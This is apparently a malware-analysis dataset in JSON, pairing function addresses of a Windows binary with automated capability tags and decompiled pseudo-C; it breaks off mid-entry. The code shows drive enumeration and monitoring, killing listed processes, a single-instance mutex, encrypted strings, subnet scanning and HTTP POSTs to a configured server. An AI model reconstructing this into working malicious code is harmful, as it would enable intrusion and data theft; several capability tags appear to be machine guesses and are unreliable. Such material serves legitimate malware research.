    "00401894": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401894(int32_t arg_8h, uint arg_ch, uint32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t arg_8h_01;\n    uint var_48h;\n    uint var_34h;\n    uint *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    arg_8h_00 = fcn.00409041(0x28);\n    var_14h = fcn.00406347(0, &var_24h);\n    var_20h = fcn.00406347(5, 0);\n    var_18h = fcn.00406347(6, 0);\n    var_ch = 0;\n    var_4h = 0;\n    var_1ch = fcn.00406347(4, 0);\n    var_30h = &var_48h;\n    var_10h = 0;\n    var_8h = 0;\n    var_34h = 0x40a20c;\n    var_2ch = 0;\n    var_28h = 0;\n    if (arg_8h_00 == 0) goto code_r0x00401a1d;\n    fcn.00408fa9(arg_8h_00, 0, 0x28);\n    if ((var_14h != 0) && (var_1ch != 0)) {\n        fcn.00408fd7(arg_8h_00, var_14h, 6);\n        fcn.00405a46();\n        iVar1 = fcn.00405fe7(var_1ch, &var_34h);\n        *(arg_8h_00 + 8) = iVar1;\n        if ((((iVar1 != 0) &&\n             ((iVar1 = fcn.004035d2(&var_ch),  iVar1 != 0 && (iVar1 = fcn.004035d2(&var_4h),  iVar1 != 0)))) &&\n            ((*(arg_14h + 0x14) == 0 || (iVar1 = fcn.004035d2(&var_8h),  iVar1 != 0)))) &&\n           ((*(arg_14h + 0x18) == 0 || (iVar1 = fcn.004035d2(&var_8h),  iVar1 != 0)))) {\n            iVar1 = *(arg_14h + 0x24);\n            if (arg_8h == 0) {\n                arg_8h_01 = var_ch;\n                var_10h = iVar1;\n                if (iVar1 == 0) {\n                    var_10h = var_4h;\n                }\n            }\n            else {\n                arg_8h_01 = iVar1;\n                if ((iVar1 == 0) && (arg_8h_01 = var_4h,  var_18h == 0)) goto code_r0x00401a14;\n            }\n            iVar1 = fcn.004015a6(arg_8h_01, var_10h, var_8h, *(arg_14h + 0x20));\n            *(arg_8h_00 + 0x20) = iVar1;\n            if (iVar1 != 0) {\n                if ((arg_8h != 0) && ((arg_10h & 0x20) != 0)) {\n                    *(arg_8h_00 + 0x24) = *(arg_8h_00 + 0x24) | 1;\n                }\n                if ((arg_10h & 0x40) != 0) {\n                    *(arg_8h_00 + 0x24) = *(arg_8h_00 + 0x24) | 2;\n                }\n                if ((arg_10h & 0x80) != 0) {\n                    *(arg_8h_00 + 0x24) = *(arg_8h_00 + 0x24) | 4;\n                }\n                goto code_r0x00401a1d;\n            }\n        }\n    }\ncode_r0x00401a14:\n    fcn.00401870();\n    arg_8h_00 = 0;\ncode_r0x00401a1d:\n    fcn.004039b7(var_14h, var_24h);\n    fcn.004039da(var_20h);\n    fcn.004039da(var_18h);\n    fcn.004039da(var_1ch);\n    if (var_ch != 0) {\n        fcn.004090a1(var_ch);\n    }\n    if (var_4h != 0) {\n        fcn.004090a1(var_4h);\n    }\n    if (var_8h != 0) {\n        fcn.004090a1(var_8h);\n    }\n    return arg_8h_00;\n}\n",
        "token_count": 1195
    },
    "00401a76": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get disk information",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401a76(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    uint hostlong;\n    int32_t iVar3;\n    uint arg_8h_01;\n    uint uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    uint uVar8;\n    int32_t arg_18h;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n    arg_8h_00 = fcn.00406347(0x14, 0);\n    iVar2 = fcn.0040530c();\n    hostlong = fcn.00403c7a();\n    uVar6 = 0;\n    fcn.00403955(arg_8h[3], 0x34, 0);\n    if (arg_8h_00 != 0) {\n        if (iVar2 == 0) goto code_r0x00401b97;\n        iVar3 = fcn.004090c6(arg_8h_00);\n        if (iVar3 != 0) {\n            do {\n                iVar3 = fcn.00405962();\n                if (iVar3 != 0) break;\n                if ((uVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                    uVar8 = arg_8h[4];\n                    uVar7 = arg_8h[3];\n                    uVar4 = *arg_8h;\n                    iVar3 = iVar2;\n                    arg_8h_01 = fcn.00401706(hostlong);\n                    iVar3 = fcn.00405840(arg_8h_01, uVar4, uVar7, uVar8, iVar3);\n                    if (iVar3 != 0) {\n                        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n                    }\n                    iVar3 = arg_8h[1];\n                    if (iVar3 != 0) {\n                        uVar8 = arg_8h[4];\n                        uVar7 = arg_8h[3];\n                        arg_18h = iVar2;\n                        uVar4 = fcn.00401706(hostlong);\n                        iVar3 = fcn.00405840(uVar4, iVar3, uVar7, uVar8, arg_18h);\n                        if (iVar3 != 0) {\n                            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n                        }\n                    }\n                }\n                uVar6 = uVar6 + 1;\n                uVar5 = fcn.004090c6(arg_8h_00);\n            } while (uVar6 < uVar5);\n        }\n        fcn.0040542b();\n    }\n    if (iVar2 != 0) {\n        fcn.004052de();\n    }\ncode_r0x00401b97:\n    fcn.004039da(arg_8h_00);\n    fcn.00403955(arg_8h[3], 0x35, 0);\n    fcn.004090a1(arg_8h);\n    return 0;\n}\n",
        "token_count": 704
    },
    "00401cc5": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "get disk information",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401cc5(uint *arg_8h)\n\n{\n    uint hostlong;\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint arg_8h_01;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint uVar7;\n    int32_t arg_18h;\n    uint32_t uStack32;\n    \n    uStack32 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n    hostlong = fcn.00403c7a();\n    arg_8h_00 = fcn.00406347(0x14, 0);\n    iVar1 = fcn.0040530c();\n    fcn.00403955(arg_8h[3], 0x38, 0);\n    if (arg_8h_00 != 0) {\n        if (iVar1 == 0) goto code_r0x00401de6;\n        while( true ) {\n            iVar5 = 0;\n            iVar4 = fcn.00405962();\n            if (iVar4 != 0) break;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n            if (uVar2 != uStack32) {\n                do {\n                    if ((~uStack32 & uVar2 & 1 << (iVar5 & 0x1f)) != 0) {\n                        uVar7 = arg_8h[4];\n                        uVar6 = arg_8h[3];\n                        uVar3 = *arg_8h;\n                        iVar4 = iVar1;\n                        arg_8h_01 = fcn.00401706(hostlong);\n                        fcn.00405840(arg_8h_01, uVar3, uVar6, uVar7, iVar4);\n                        iVar4 = arg_8h[1];\n                        if (iVar4 != 0) {\n                            uVar7 = arg_8h[4];\n                            uVar6 = arg_8h[3];\n                            arg_18h = iVar1;\n                            uVar3 = fcn.00401706(hostlong);\n                            fcn.00405840(uVar3, iVar4, uVar6, uVar7, arg_18h);\n                        }\n                    }\n                    iVar5 = iVar5 + 1;\n                } while (iVar5 < 0x20);\n                fcn.0040542b();\n                uStack32 = uVar2;\n            }\n            (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n        }\n    }\n    if (iVar1 != 0) {\n        fcn.004052de();\n    }\ncode_r0x00401de6:\n    fcn.004039da(arg_8h_00);\n    fcn.00403955(arg_8h[3], 0x39, 0);\n    fcn.004090a1(arg_8h);\n    return 0;\n}\n",
        "token_count": 659
    },
    "0040242f": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0040242f(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint lpExitCode;\n    int32_t hHandle;\n    uint var_4h;\n    \n    iVar4 = 0x32;\n    var_4h = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateEventW)(0, 0, 0, 0);\n    if (iVar2 != 0) {\n        hHandle = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040454b, iVar2, 0, 0);\n        do {\n            iVar4 = iVar4 + -1;\n            iVar3 = fcn.00404f7a(1);\n            if (iVar3 == 0) {\n                var_4h = 1;\n                break;\n            }\n            (*_sym.imp.KERNEL32.dll_Sleep)(100);\n        } while (iVar4 != 0);\n        (*_sym.imp.KERNEL32.dll_SetEvent)(iVar2);\n        iVar4 = hHandle;\n        lpExitCode = 0;\n        iVar3 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(hHandle, 0xffffffff);\n        if (iVar3 == 0) {\n            (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(iVar4, &lpExitCode);\n        }\n        pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n        if (iVar4 != 0) {\n            (*pcVar1)(iVar4);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 379
    },
    "00402946": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402946(void)\n\n{\n    uint dwOptionalLength;\n    int32_t lpOptional;\n    uint var_28h;\n    uint *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    fcn.00403c7a();\n    var_8h = fcn.00406347(0x44, 0);\n    var_ch = fcn.00406347(0x45, 0);\n    var_4h = fcn.00406347(0x46, 0);\n    var_24h = &var_18h;\n    var_28h = 0x40a3b4;\n    var_20h = 0;\n    var_1ch = 0;\n    lpOptional = 0;\n    fcn.00405ab0();\n    if (var_4h != 0) {\n        lpOptional = fcn.0040620d(var_4h, &var_28h);\n        if (lpOptional != 0) {\n            dwOptionalLength = fcn.004090b5(lpOptional);\n            fcn.00403cbd(var_8h, var_ch, lpOptional, dwOptionalLength);\n        }\n    }\n    fcn.004039da(var_8h);\n    fcn.004039da(var_ch);\n    fcn.004039f9(var_4h);\n    fcn.004039f9(lpOptional);\n    return;\n}\n",
        "token_count": 346
    },
    "004031e1": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004031e1(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t arg_10h;\n    int32_t *unaff_ESI;\n    \n    uVar1 = 0;\n    if (arg_ch <= unaff_ESI[5] - unaff_ESI[4]) {\n        uVar1 = unaff_ESI[3];\n        if ((uVar1 < unaff_ESI[2]) || (arg_10h = unaff_ESI[1] - uVar1,  arg_ch <= arg_10h)) {\n            fcn.00408fd7(uVar1, arg_8h, arg_ch);\n            unaff_ESI[3] = unaff_ESI[3] + arg_ch;\n        }\n        else {\n            fcn.00408fd7(uVar1, arg_8h, arg_10h);\n            fcn.00408fd7(*unaff_ESI, arg_10h + arg_8h, arg_ch - arg_10h);\n            unaff_ESI[3] = *unaff_ESI + (arg_ch - arg_10h);\n        }\n        unaff_ESI[4] = unaff_ESI[4] + arg_ch;\n        uVar1 = arg_ch;\n    }\n    return uVar1;\n}\n",
        "token_count": 303
    },
    "00403246": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00403246(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t arg_10h;\n    int32_t *unaff_ESI;\n    \n    uVar1 = 0;\n    if (arg_ch <= unaff_ESI[4]) {\n        uVar1 = unaff_ESI[2];\n        if ((uVar1 < unaff_ESI[3]) || (arg_10h = unaff_ESI[1] - uVar1,  arg_ch <= arg_10h)) {\n            fcn.00408fd7(arg_8h, uVar1, arg_ch);\n            unaff_ESI[2] = unaff_ESI[2] + arg_ch;\n        }\n        else {\n            fcn.00408fd7(arg_8h, uVar1, arg_10h);\n            fcn.00408fd7(arg_10h + arg_8h, *unaff_ESI, arg_ch - arg_10h);\n            unaff_ESI[2] = *unaff_ESI + (arg_ch - arg_10h);\n        }\n        unaff_ESI[4] = unaff_ESI[4] - arg_ch;\n        uVar1 = arg_ch;\n    }\n    return uVar1;\n}\n",
        "token_count": 294
    },
    "00403cbd": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "prepare HTTP request",
            "initialize WinHTTP library",
            "receive HTTP response"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403cbd(uint pswzServerName, uint arg_ch, uint lpOptional, uint dwOptionalLength)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpOpen)(0x40a3c0, 1, 0, 0, 0);\n    if (iVar2 != 0) {\n        iVar3 = (*_sym.imp.WINHTTP.dll_WinHttpConnect)(iVar2, pswzServerName, 0, 0);\n        pcVar1 = _sym.imp.WINHTTP.dll_WinHttpCloseHandle;\n        if (iVar3 != 0) {\n            iVar4 = (*_sym.imp.WINHTTP.dll_WinHttpOpenRequest)(iVar3, L\"POST\", arg_ch, 0, 0, 0, 0);\n            if (iVar4 != 0) {\n                iVar5 = (*_sym.imp.WINHTTP.dll_WinHttpSendRequest)\n                                  (iVar4, 0, 0, lpOptional, dwOptionalLength, dwOptionalLength, 0);\n                if (iVar5 != 0) {\n                    var_4h = (*_sym.imp.WINHTTP.dll_WinHttpReceiveResponse)(iVar4, 0);\n                }\n                (*pcVar1)(iVar4);\n            }\n            (*pcVar1)(iVar3);\n        }\n        (*pcVar1)(iVar2);\n    }\n    return var_4h;\n}\n",
        "token_count": 374
    },
    "004042bd": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004042bd(uint noname_0, uint arg_ch, int32_t *arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_210h;\n    \n    if ((*arg_10h == 0x10) && (*(arg_10h + 0xb) == 0x76)) {\n        iVar1 = fcn.004059f1(&var_210h, 0x104, 3);\n        if (iVar1 != 0) {\n            iVar1 = fcn.0040411d(2, &var_210h, 0, 0, *(arg_14h + 8));\n            *(arg_14h + 0xc) = *(arg_14h + 0xc) + (0 < iVar1);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 193
    },
    "0040489e": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040489e(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_60h;\n    uint var_5ch;\n    uint var_18h;\n    uint var_14h;\n    uint uStack20;\n    uint uStack16;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    iVar2 = fcn.00409041(0x20a);\n    var_60h = 0;\n    fcn.00408fa9(&var_5ch, 0, 0x40);\n    var_18h = 0;\n    var_14h = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    fcn.00403d4b(&var_8h, 0);\n    if (iVar2 != 0) {\n        iVar3 = fcn.00405b0e(iVar2);\n        if (iVar3 != 0) {\n            var_60h = 0x44;\n            var_4h = (*_sym.imp.KERNEL32.dll_CreateProcessW)(0, iVar2, 0, 0, 0, 0, 0, 0, &var_60h, &var_18h);\n            pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n            if (var_4h != 0) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(var_18h);\n                (*pcVar1)(var_14h);\n            }\n        }\n    }\n    fcn.00403d4b(var_8h, 1);\n    if (iVar2 != 0) {\n        fcn.004090a1(iVar2);\n    }\n    return var_4h;\n}\n",
        "token_count": 410
    },
    "00404dee": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "enumerate processes/f67bedfed7e245aa9b0908c198426ab8",
            "contain loop",
            "terminate process",
            "enumerate processes"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00404dee(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_234h;\n    uint dwProcessId;\n    uint var_210h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_8h = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2, 0);\n    if (var_8h != 0) {\n        fcn.00408fa9(&var_234h, 0, 0x22c);\n        var_234h = 0x22c;\n        iVar2 = (*_sym.imp.KERNEL32.dll_Process32FirstW)(var_8h, &var_234h);\n        pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n        while (iVar2 != 0) {\n            iVar2 = fcn.00403711(&var_210h);\n            if (-1 < iVar2) {\n                iVar3 = 0;\n                iVar2 = (*_sym.imp.KERNEL32.dll_OpenProcess)(1, 0, dwProcessId);\n                if (iVar2 != 0) {\n                    iVar3 = (*_sym.imp.KERNEL32.dll_TerminateProcess)(iVar2, 0);\n                    (*pcVar1)(iVar2);\n                }\n                var_4h = var_4h + iVar3;\n            }\n            iVar2 = (*_sym.imp.KERNEL32.dll_Process32NextW)(var_8h, &var_234h);\n        }\n        (*pcVar1)(var_8h);\n    }\n    return var_4h;\n}\n",
        "token_count": 380
    },
    "00404ea5": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create mutex",
            "check mutex and exit"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00404ea5(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t *unaff_ESI;\n    bool bVar2;\n    uint var_4ch;\n    uint *var_48h;\n    char16_t *var_44h;\n    uint *var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_20h;\n    uint var_ch;\n    \n    fcn.00403c7a();\n    var_ch = fcn.00406347(0x19, 0);\n    var_48h = &var_20h;\n    var_40h = &var_34h;\n    var_4ch = 0x40a20c;\n    var_44h = L\"ELVL\";\n    var_3ch = 0;\n    var_38h = 0;\n    *unaff_ESI = 0;\n    fcn.00405a46();\n    fcn.00405a46();\n    arg_8h_00 = fcn.00405fe7(var_ch, &var_4ch);\n    if (arg_8h_00 == 0) {\n        bVar2 = false;\n    }\n    else {\n        iVar1 = (*_sym.imp.KERNEL32.dll_OpenMutexW)(0x100000, 0, arg_8h_00);\n        *unaff_ESI = iVar1;\n        if (iVar1 == 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_CreateMutexW)(0, 0, arg_8h_00);\n            *unaff_ESI = iVar1;\n            if (iVar1 == 0) {\n                bVar2 = false;\n                goto code_r0x00404f62;\n            }\n        }\n        iVar1 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*unaff_ESI, 0);\n        bVar2 = iVar1 == 0;\n        if (bVar2) goto code_r0x00404f62;\n    }\n    if (*unaff_ESI != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*unaff_ESI);\n        *unaff_ESI = 0;\n    }\ncode_r0x00404f62:\n    fcn.004039da(var_ch);\n    fcn.004039da(arg_8h_00);\n    return bVar2;\n}\n",
        "token_count": 550
    },
    "00404fa9": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404fa9(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_224h;\n    uint32_t var_11ch;\n    uint var_118h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetTickCount;\n    iVar3 = 0;\n    var_8h = 0;\n    var_14h = 0;\n    var_10h = 10000;\n    var_ch = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    iVar2 = (*pcVar1)();\n    while (iVar2 - var_ch < 1000) {\n        var_11ch = 0x40;\n        if (0x200U - iVar3 < 0x41) {\n            var_11ch = 0x200U - iVar3;\n        }\n        fcn.00408fd7(&var_118h, arg_8h + iVar3 * 4, var_11ch);\n        iVar3 = iVar3 + var_11ch;\n        fcn.00408fd7(&var_224h, &var_11ch, 0x104);\n        iVar2 = (*_sym.imp.WS2_32.dll_select)(0, &var_11ch, 0, &var_224h, &var_14h);\n        var_8h = var_8h | 0 < iVar2;\n        iVar2 = (*pcVar1)();\n    }\n    return var_8h;\n}\n",
        "token_count": 372
    },
    "00405230": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405230(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t *puVar6;\n    uint32_t uVar7;\n    uint32_t *puStack24;\n    uint auStack20 [2];\n    uint32_t *puStack12;\n    \n    auStack20[0] = 15000;\n    puVar2 = fcn.00409041(15000);\n    if (puVar2 != NULL) {\n        puStack12 = puVar2;\n        iVar3 = (*_sym.imp.IPHLPAPI.DLL_GetIpAddrTable)(puVar2, auStack20, 0);\n        pcVar1 = _sym.imp.WS2_32.dll_ntohl;\n        if ((iVar3 == 0) && (uVar7 = 0,  *puVar2 != 0)) {\n            puVar6 = puVar2 + 1;\n            do {\n                iVar3 = (*pcVar1)(*puVar6);\n                if (iVar3 != 0x7f000001) {\n                    uVar4 = (*pcVar1)(*puVar6);\n                    uVar5 = (*pcVar1)(puVar6[2]);\n                    fcn.00405067(uVar5 & uVar4, arg_8h);\n                    fcn.00405067(uVar4 + 1, arg_8h);\n                    puVar2 = puStack24;\n                }\n                uVar7 = uVar7 + 1;\n                puVar6 = puVar6 + 6;\n            } while (uVar7 < *puVar2);\n        }\n        fcn.004090a1(puVar2);\n    }\n    return;\n}\n",
        "token_count": 402
    },
    "00405ec2": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405ec2(int32_t arg_8h, uint32_t arg_ch, code *arg_10h, uint arg_14h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_18h;\n    ushort uStack24;\n    uint var_10h;\n    ushort uStack16;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_10h = *0x40a41c;\n    uStack16 = *0x40a420;\n    var_4h = arg_ch;\n    var_18h = *0x40a424;\n    uStack24 = *0x40a428;\n    iVar1 = fcn.00409163(arg_8h, &var_10h);\n    if (iVar1 != 0) {\n        do {\n            uVar2 = iVar1 - arg_8h >> 1;\n            if (var_4h < uVar2) {\n                return 0;\n            }\n            fcn.00408fd7(in_EAX, arg_8h, uVar2 * 2);\n            var_4h = var_4h - uVar2;\n            arg_8h = arg_8h + uVar2 * 2;\n            iVar1 = iVar1 + 4;\n            in_EAX = in_EAX + uVar2 * 2;\n            var_8h = fcn.00409163(iVar1, &var_18h);\n            if (var_8h == 0) break;\n            uVar2 = (*arg_10h)(iVar1, var_8h - iVar1 >> 1, in_EAX, var_4h, arg_14h);\n            if (var_4h < uVar2) {\n                return 0;\n            }\n            var_4h = var_4h - uVar2;\n            var_8h = var_8h + 4;\n            in_EAX = in_EAX + uVar2 * 2;\n            if (uVar2 == 0) {\n                uVar2 = var_8h - arg_8h >> 1;\n                if (var_4h < uVar2) {\n                    return 0;\n                }\n                fcn.00408fd7(in_EAX, arg_8h, uVar2 * 2);\n                in_EAX = in_EAX + uVar2 * 2;\n                var_4h = var_4h - uVar2;\n            }\n            arg_8h = var_8h;\n            iVar1 = fcn.00409163(var_8h, &var_10h);\n        } while (iVar1 != 0);\n        if (var_4h < uVar2) {\n            return 0;\n        }\n    }\n    uVar2 = fcn.004090c6(arg_8h);\n    if (var_4h < uVar2) {\n        return 0;\n    }\n    fcn.00408fd7(in_EAX, arg_8h, uVar2 * 2);\n    *(uVar2 * 2 + in_EAX) = 0;\n    return (uVar2 - var_4h) + arg_ch;\n}\n",
        "token_count": 726
    },
    "00406065": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00406065(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    int32_t arg_ch_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t arg_14h_00;\n    uint32_t uVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h._0_2_ = *0x40a42c;\n    var_4h._2_1_ = *0x40a42e;\n    var_8h._0_2_ = *0x40a430;\n    var_8h._2_1_ = *0x40a432;\n    iVar1 = fcn.004091c0(arg_8h, &var_4h);\n    arg_14h_00 = arg_10h;\n    if (iVar1 != 0) {\n        do {\n            uVar3 = iVar1 - arg_8h;\n            if (arg_14h_00 < uVar3) {\n                return 0;\n            }\n            fcn.00408fd7(arg_ch, arg_8h, uVar3);\n            arg_ch = arg_ch + uVar3;\n            arg_ch_00 = arg_8h + uVar3;\n            iVar1 = iVar1 + 2;\n            arg_14h_00 = arg_14h_00 - uVar3;\n            iVar2 = fcn.004091c0(iVar1, &var_8h);\n            arg_8h = arg_ch_00;\n            if (iVar2 == 0) break;\n            uVar3 = fcn.004061be(iVar1, iVar2 - iVar1, arg_ch, arg_14h_00, arg_14h);\n            if (arg_14h_00 < uVar3) {\n                return 0;\n            }\n            arg_ch = arg_ch + uVar3;\n            arg_14h_00 = arg_14h_00 - uVar3;\n            arg_8h = iVar2 + 2;\n            if (uVar3 == 0) {\n                uVar3 = arg_8h - arg_ch_00;\n                if (arg_14h_00 < uVar3) {\n                    return 0;\n                }\n                fcn.00408fd7(arg_ch, arg_ch_00, uVar3);\n                arg_ch = arg_ch + uVar3;\n                arg_14h_00 = arg_14h_00 - uVar3;\n            }\n            iVar1 = fcn.004091c0(arg_8h, &var_4h);\n        } while (iVar1 != 0);\n        if (arg_14h_00 < uVar3) {\n            return 0;\n        }\n    }\n    uVar3 = fcn.004090b5(arg_8h);\n    if (arg_14h_00 < uVar3) {\n        return 0;\n    }\n    fcn.00408fd7(arg_ch, arg_8h, uVar3);\n    *(uVar3 + arg_ch) = 0;\n    return (uVar3 - arg_14h_00) + arg_10h;\n}\n",
        "token_count": 737
    },
    "00406347": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00406347(int32_t arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t arg_10h;\n    int32_t arg_8h_00;\n    int32_t iVar5;\n    uchar auStack320 [16];\n    uchar auStack304 [300];\n    \n    piVar3 = *0x40b440;\n    iVar5 = (*0x40b440)[1];\n    if (iVar5 != 0) {\n        iVar1 = **0x40b440;\n        piVar4 = iVar5 * 0xc + iVar1;\n        do {\n            piVar4 = piVar4 + -3;\n            iVar5 = iVar5 + -1;\n            if (*piVar4 == arg_8h) {\n                iVar5 = iVar5 * 0xc;\n                uVar2 = *(iVar1 + 8 + iVar5);\n                arg_10h = (uVar2 - (uVar2 & 0xf)) + 0x10;\n                arg_8h_00 = fcn.00409041(arg_10h);\n                if (arg_8h_00 == 0) {\n                    return 0;\n                }\n                fcn.00408fd7(arg_8h_00, *(iVar1 + 4 + iVar5) + piVar3[2], arg_10h);\n                fcn.00408fa9(auStack320, 0, 0x10);\n                fcn.004068ee(auStack304, piVar3 + 4, auStack320);\n                fcn.0040644e(auStack304, arg_8h_00, arg_8h_00);\n                fcn.00408fa9(auStack304, 0, 0x128);\n                if (arg_ch == NULL) {\n                    return arg_8h_00;\n                }\n                *arg_ch = *(*piVar3 + 8 + iVar5);\n                return arg_8h_00;\n            }\n        } while (iVar5 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 488
    },
    "00407a0a": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
